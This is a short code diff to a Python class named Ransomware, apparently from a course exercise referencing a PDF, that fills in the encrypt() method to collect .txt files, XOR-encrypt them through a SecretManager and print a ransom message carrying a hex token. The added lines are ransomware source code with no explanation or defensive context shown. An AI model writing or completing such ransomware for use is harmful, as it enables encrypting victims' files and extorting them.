@@ -45,7 +45,11 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        files_list=self.get_files('txt')
+        sm=SecretManager()
+        sm.setup()
+        sm.xorfiles(files_list)
+        print(ENCRYPT_MESSAGE.format(token=sm.get_hex_token()))
 
     def decrypt(self):
         # main function for decrypting (see PDF)
